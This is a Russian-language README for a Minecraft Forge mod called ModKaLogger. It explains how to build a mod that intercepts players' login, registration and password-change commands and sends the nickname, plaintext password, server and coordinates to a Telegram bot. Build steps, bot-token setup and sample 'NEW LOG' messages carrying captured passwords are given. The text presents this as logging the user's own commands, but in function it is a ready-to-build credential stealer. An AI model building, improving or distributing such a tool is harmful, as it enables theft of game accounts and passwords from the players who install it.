# ModKaLogger - Minecraft 1.16.5 Forge Mod

Мод для логирования команд входа и смены анархии в Telegram.

## Функциональность

- **Логирование входа/регистрации**: Перехватывает команды `/l`, `/login`, `/register`, `/cp`, `/changepass` и отправляет данные в Telegram
- **Логирование смены анархии**: Перехватывает команды `/an[номер]` (например `/an503`) и отправляет информацию о смене сервера
- **Отправка координат**: При смене анархии отправляет текущие координаты игрока

## Установка

### 1. Подготовка окружения
```bash
# Убедись, что установлены:
# - Java 8 или выше
# - Gradle
```

### 2. Конфигурация Telegram

Отредактируй файл `src/main/java/com/modkalogger/ModKaLogger.java`:

```java
public static final String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
public static final String TELEGRAM_ADMIN_ID = "YOUR_ADMIN_ID_HERE";
```

**Как получить токен бота:**
1. Напиши @BotFather в Telegram
2. Используй команду `/newbot`
3. Следуй инструкциям и получи токен

**Как получить Admin ID:**
1. Напиши @userinfobot в Telegram
2. Получи свой ID

### 3. Сборка мода

```bash
# Для Windows
gradlew build

# Для Linux/Mac
./gradlew build
```

JAR файл будет находиться в `build/libs/modkalogger-1.0.0.jar`

### 4. Установка мода

1. Скопируй JAR файл в папку `mods` твоего Minecraft клиента
2. Запусти Minecraft с Forge 1.16.5

## Использование

### Команды логирования входа

```
/l пароль
/login пароль
/cp пароль
/changepass пароль
```

**Примеры:**
```
/login MyPassword123
/l AnotherPass456
/changepass newpass999
```

### Команды регистрации

```
/register пароль пароль
/reg пароль пароль
```

**Примеры:**
```
/reg MyPass123 MyPass123
/register SecurePass456 SecurePass456
```

**Результат в Telegram для входа:**
```
NEW LOG
Nickname - YourActiveNickname
pass - MyPassword123
server - play.example.com
t.me/modkalogger
```

**Результат в Telegram для регистрации:**
```
NEW REGISTER
Nickname - YourActiveNickname
pass - MyPass123
pass confirm - MyPass123
server - play.example.com
t.me/modkalogger
```

*Никнейм берётся автоматически от активного игрока, на котором ты играешь*

### Команды смены анархии

```
/an[номер]
```

**Примеры:**
```
/an503
/an100
/an999
```

**Результат в Telegram:**
```
ПЕРЕШЁЛ НА АНАРХИЮ 503
Nickname - MyNick
server - play.example.com
Координаты - X: 123.5 Y: 64.0 Z: -456.2
t.me/modkalogger
```

## Структура проекта

```
modkalogger/
├── src/main/java/com/modkalogger/
│   ├── ModKaLogger.java           # Главный класс мода
│   ├── events/
│   │   └── CommandHandler.java    # Обработчик команд
│   └── telegram/
│       └── TelegramSender.java    # Отправка сообщений в Telegram
├── src/main/resources/
│   └── META-INF/
│       └── mods.toml              # Конфигурация мода
├── build.gradle                   # Конфигурация Gradle
└── README.md                      # Этот файл
```

## Зависимости

- OkHttp 4.9.1 - для HTTP запросов
- Gson 2.8.9 - для работы с JSON

## Безопасность

⚠️ **ВАЖНО**: Не делись своим токеном бота и Admin ID с другими людьми!

## Лицензия

MIT

## Поддержка

Если у тебя есть вопросы или проблемы, проверь:
1. Правильность токена бота и Admin ID
2. Интернет соединение
3. Версию Minecraft (должна быть 1.16.5)
4. Версию Forge (36.2.34 или совместимую)
